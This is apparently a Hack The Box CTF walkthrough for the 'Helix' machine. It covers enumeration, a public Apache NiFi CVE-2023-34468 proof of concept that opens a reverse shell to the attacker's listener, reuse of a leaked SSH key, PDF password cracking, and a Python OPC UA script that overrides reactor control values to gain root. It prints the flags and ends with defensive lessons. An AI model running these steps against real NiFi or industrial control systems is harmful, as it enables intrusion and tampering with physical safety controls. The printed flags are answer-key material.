````markdown
# Helix — HTB CTF Walkthrough

**Difficulty:** Medium  
**OS:** Linux (Ubuntu 22.04)  
**User Flag:** `041644d9e33a08f54b6b4f3574202ee4`  
**Root Flag:** `e3713083ef53ab530ddd378534cab61a`

---

## 1. Reconnaissance

### 1.1 Nmap Scan

```bash
nmap -sC -sV -vv 10.129.28.135 -o helix.nmap
```
````

**Open Ports:**

| Port   | Service | Detail                           |
| ------ | ------- | -------------------------------- |
| 22/tcp | SSH     | OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 |
| 80/tcp | HTTP    | nginx 1.18.0 (Ubuntu)            |

The HTTP service on port 80 immediately redirects to `http://helix.htb/`, indicating virtual host routing is in use.

### 1.2 Add Virtual Host Entry

```bash
echo "10.129.28.135 helix.htb" | sudo tee -a /etc/hosts
```

### 1.3 Web Enumeration

Visiting `http://helix.htb/` reveals a static marketing page for **Helix Industries** – industrial automation and critical infrastructure. The page is purely static (no forms, no dynamic parameters). Directory brute‑forcing and Nikto confirm no interesting directories or files.

### 1.4 Virtual Host Discovery

Since the main site is static, we turn to virtual host enumeration:

```bash
gobuster vhost -u http://helix.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 20 --append-domain
```

**Found:** `flow.helix.htb` (Status: 200)

Add the subdomain to `/etc/hosts`:

```bash
echo "10.129.28.135 flow.helix.htb" | sudo tee -a /etc/hosts
```

Visiting `http://flow.helix.htb` redirects to `/nifi/` – an **Apache NiFi** instance version **1.21.0**.

---

## 2. Initial Foothold — Apache NiFi RCE (CVE-2023-34468)

### 2.1 Vulnerability Overview

**CVE-2023-34468** is a critical authenticated Remote Code Execution vulnerability affecting Apache NiFi versions prior to 1.23.0. The root cause is that NiFi includes an H2 database driver by default, and an authenticated user with write access to the flow can configure a `DBCPConnectionPool` service with a malicious H2 JDBC URL. This URL can execute arbitrary Java code via H2’s `INIT` command, leading to remote code execution.

In our case, the NiFi instance was configured to allow anonymous write access to the flow (the API returned `canWrite: true` for the root process group), meaning authentication was not required.

### 2.2 Exploit

We used the public proof‑of‑concept from [Al3xx-sec/CVE-2023-34468-POC](https://github.com/Al3xx-sec/CVE-2023-34468-POC).

First, start a listener on your attack machine:

```bash
nc -lvnp 4444
```

Clone and run the PoC, replacing `10.10.15.5` with your VPN IP:

```bash
git clone https://github.com/Al3xx-sec/CVE-2023-34468-POC.git
cd CVE-2023-34468-POC
pip install requests
python3 poc.py --target http://flow.helix.htb --lhost 10.10.15.5 --lport 4444 --cleanup
```

**Result:** A reverse shell is received as user `nifi`.

```
nifi@helix:/opt/nifi-1.21.0$
```

---

## 3. Post-Exploitation Enumeration

### 3.1 Basic Situational Awareness

```bash
id
# uid=998(nifi) gid=998(nifi) groups=998(nifi)

cat /etc/passwd | grep -v nologin | grep -v false
# root, operator, nifi — three interactive users

ls /home/
# operator
```

No user flag in `/home/nifi` (in fact, the nifi user’s home is `/opt/nifi-1.21.0`). The user flag likely belongs to `operator`.

### 3.2 SSH Key Discovery

While exploring the NiFi installation directory, we find a backup of an SSH private key:

```bash
cd /opt/nifi-1.21.0/support-bundles
ls
# operator_id_ed25519.bak
cat operator_id_ed25519.bak
```

The file contains a complete OpenSSH private key for the `operator` user.

### 3.3 SSH as Operator

Copy the key to your Kali machine, set strict permissions, and connect:

```bash
chmod 600 operator_id_ed25519
ssh -i operator_id_ed25519 operator@10.129.28.151
```

Once logged in, read the user flag:

```bash
cat /home/operator/user.txt
041644d9e33a08f54b6b4f3574202ee4
```

---

## 4. Privilege Escalation — OPC UA Manipulation

### 4.1 Examine Operator's Home

Two files are present in `/home/operator`:

- `control systems diagram.png` – an image
- `Operator Control & Safety Guide.pdf` – password protected

### 4.2 Crack the PDF Password

Use `pdf2john` and John the Ripper with the `rockyou` wordlist:

```bash
pdf2john "Operator Control & Safety Guide.pdf" > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

**Password:** `operator1`

### 4.3 Read the PDF Contents

```bash
pdftotext -upw operator1 "Operator Control & Safety Guide.pdf" -
```

The document describes a reactor control system accessed via **OPC UA**. It outlines the conditions for a **Privileged Maintenance Window**:

- Temperature ≥ 295°C **or** Pressure ≥ 73 bar
- Mode = `MAINTENANCE`
- `TestOverride` enabled
- `CalibrationOffset` increased

When these conditions are met, the PLC opens the maintenance window, allowing the operator to run `/usr/local/sbin/helix-maint-console` via `sudo` without a password, which grants a root shell.

### 4.4 Discover OPC UA Service

From the `operator` shell:

```bash
ss -tulpn | grep 4840
```

The OPC UA server is listening on `localhost:4840`. An HMI web interface is also present on `localhost:8081`.

### 4.5 SSH Tunneling

Forward both ports to your Kali machine:

```bash
ssh -L 4840:127.0.0.1:4840 -L 8081:127.0.0.1:8081 operator@10.129.28.151 -i operator_id_ed25519
```

### 4.6 OPC UA Manipulation Script

Create a Python virtual environment and install the `opcua` library:

```bash
python3 -m venv opcenv
source opcenv/bin/activate
pip install opcua
```

Create `root_exploit.py` with the following content:

```python
from opcua import Client
import time

url = "opc.tcp://127.0.0.1:4840/helix/"
client = Client(url)

try:
    client.connect()
    print("[+] Connected to OPC UA via tunnel")

    nodes = {}
    for parent_id in ["ns=2;i=2", "ns=2;i=11"]:
        for child in client.get_node(parent_id).get_children():
            nodes[child.get_browse_name().Name] = child

    nodes["Mode"].set_value("MAINTENANCE")
    nodes["TestOverride"].set_value(True)
    nodes["CalibrationOffset"].set_value(20.0)

    print("[+] Payload injected. Hazardous condition simulated!")
    time.sleep(5)

finally:
    client.disconnect()
```

Run the script:

```bash
python root_exploit.py
```

### 4.7 Trigger Root Shell

Back in the original SSH session as `operator`, execute the privileged console:

```bash
sudo /usr/local/sbin/helix-maint-console
```

The maintenance window is open, and the command drops you into an interactive root shell.

```
root@helix:/home/operator# id
uid=0(root) gid=0(root) groups=0(root)
```

### 4.8 Capture the Flags

```bash
cat /root/root.txt
e3713083ef53ab530ddd378534cab61a
```

---

## 5. Attack Chain Summary

```
Nmap → nginx:80 (helix.htb) + vhost enum → flow.helix.htb → NiFi 1.21.0
         ↓
CVE-2023-34468 (unauthenticated RCE via malicious DBCP service) → shell as nifi
         ↓
File system enumeration → SSH private key for operator in support-bundles
         ↓
SSH as operator → user flag
         ↓
PDF password crack (operator1) → understand OPC UA reactor control logic
         ↓
SSH tunnel 4840 (OPC UA) and 8081 (HMI)
         ↓
OPC UA manipulation (Mode=MAINTENANCE, TestOverride=True, CalibrationOffset=20.0) → maintenance window opens
         ↓
sudo /usr/local/sbin/helix-maint-console → root shell
         ↓
Read /root/root.txt
```

---

## 6. Key Takeaways

**CVE-2023-34468 (NiFi RCE):** Allowing anonymous write access to the NiFi flow is a critical misconfiguration. Even without it, default H2 drivers in NiFi create a powerful RCE primitive for any authenticated user. NiFi instances should never be exposed to untrusted networks without proper authentication and authorization.

**Sensitive backups in accessible directories:** The SSH private key for `operator` was left in a support bundle within the NiFi installation directory, readable by the `nifi` user. Backups and recovery files must be secured or removed after use.

**Weak PDF password:** The PDF password `operator1` was easily cracked with a standard wordlist. Sensitive documentation should be protected with strong, unique passwords or encrypted with a proper key management system.

**OPC UA security:** The OPC UA server was bound to localhost, but once an attacker gains a shell on the host, it becomes reachable. OPC UA should enforce authentication and authorization, and critical variables should not be writable by unprivileged users. The maintenance window logic, while intended to be safe, could be abused to escalate privileges because it trusts the PLC state without secondary verification.

**World-writable binaries:** Although not used in this intended path, the `/usr/bin/bash` binary was world-writable (777 permissions). This is a severe local privilege escalation vector that could be exploited by any user to gain root via cron jobs. File permissions should be strictly controlled.

**Hidden functionality in root services:** The `helix-maint-console` script checks for a file that is created when hazardous conditions are met. This design assumes the PLC cannot be manipulated by an attacker – a dangerous assumption in a CTF, and in real ICS environments.

```

```
